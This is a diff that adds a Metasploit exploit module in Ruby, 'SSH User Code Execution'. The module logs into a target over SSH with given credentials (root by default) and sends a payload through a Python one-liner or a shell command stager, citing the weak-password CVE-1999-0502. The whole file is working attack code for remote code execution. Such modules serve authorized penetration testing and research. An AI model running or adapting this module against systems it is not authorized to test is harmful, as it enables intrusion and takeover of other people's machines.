@@ -1,0 +1,147 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'net/ssh'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ManualRanking
+
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Remote::SSH
+
+  attr_accessor :ssh_socket
+
+  def initialize
+    super(
+      'Name'             => 'SSH User Code Execution',
+      'Description'      => %q{
+        This module connects to the target system and executes the necessary
+        commands to run the specified payload via SSH. If a native payload is
+        specified, an appropriate stager will be used.
+      },
+      'Author'           => ['Spencer McIntyre', 'Brandon Knight'],
+      'References'       =>
+        [
+          [ 'CVE', '1999-0502'] # Weak password
+        ],
+      'License'          => MSF_LICENSE,
+      'Privileged'       => true,
+      'DefaultOptions'   =>
+        {
+          'PrependFork'  => 'true',
+          'EXITFUNC'     => 'process'
+        },
+      'Payload'          =>
+        {
+          'Space'        => 4096,
+          'BadChars'     => "",
+          'DisableNops'  => true
+        },
+      'Platform'         => %w{ linux osx python },
+      'Targets'          =>
+        [
+          [ 'Linux x86',
+            {
+              'Arch'     => ARCH_X86,
+              'Platform' => 'linux'
+            }
+          ],
+          [ 'Linux x64',
+            {
+              'Arch'     => ARCH_X64,
+              'Platform' => 'linux'
+            }
+          ],
+          [ 'OSX x86',
+            {
+              'Arch'     => ARCH_X86,
+              'Platform' => 'osx'
+            }
+          ],
+          [ 'Python',
+            {
+              'Arch'     => ARCH_PYTHON,
+              'Platform' => 'python'
+            }
+          ]
+        ],
+      'CmdStagerFlavor'  => %w{ bourne echo printf },
+      'DefaultTarget'    => 0,
+      # For the CVE
+      'DisclosureDate'   => 'Jan 01 1999'
+    )
+
+    register_options(
+      [
+        OptString.new('USERNAME', [ true, "The user to authenticate as.", 'root' ]),
+        OptString.new('PASSWORD', [ true, "The password to authenticate with.", '' ]),
+        OptString.new('RHOST', [ true, "The target address" ]),
+        Opt::RPORT(22)
+      ], self.class
+    )
+
+    register_advanced_options(
+      [
+        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false])
+      ]
+    )
+  end
+
+  def execute_command(cmd, opts = {})
+    vprint_status("Executing #{cmd}")
+    begin
+      Timeout.timeout(3) do
+        self.ssh_socket.exec!("#{cmd}\n")
+      end
+    rescue ::Exception
+    end
+  end
+
+  def do_login(ip, user, pass, port)
+    factory = ssh_socket_factory
+    opt_hash = {
+      :auth_methods  => ['password', 'keyboard-interactive'],
+      :port          => port,
+      :use_agent     => false,
+      :config        => false,
+      :password      => pass,
+      :proxy         => factory,
+      :non_interactive => true
+    }
+
+    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+
+    begin
+      self.ssh_socket = Net::SSH.start(ip, user, opt_hash)
+    rescue Rex::ConnectionError
+      fail_with(Failure::Unreachable, 'Disconnected during negotiation')
+    rescue Net::SSH::Disconnect, ::EOFError
+      fail_with(Failure::Disconnected, 'Timed out during negotiation')
+    rescue Net::SSH::AuthenticationFailed
+      fail_with(Failure::NoAccess, 'Failed authentication')
+    rescue Net::SSH::Exception => e
+      fail_with(Failure::Unknown, "SSH Error: #{e.class} : #{e.message}")
+    end
+
+    if not self.ssh_socket
+      fail_with(Failure::Unknown, 'Failed to start SSH socket')
+    end
+    return
+  end
+
+  def exploit
+    do_login(datastore['RHOST'], datastore['USERNAME'], datastore['PASSWORD'], datastore['RPORT'])
+
+    print_status("#{datastore['RHOST']}:#{datastore['RPORT']} - Sending stager...")
+    if target['Platform'] == 'python'
+      execute_command("python -c \"#{payload.encoded}\"")
+    else
+      execute_cmdstager({:linemax => 500})
+    end
+
+    self.ssh_socket.close
+  end
+end
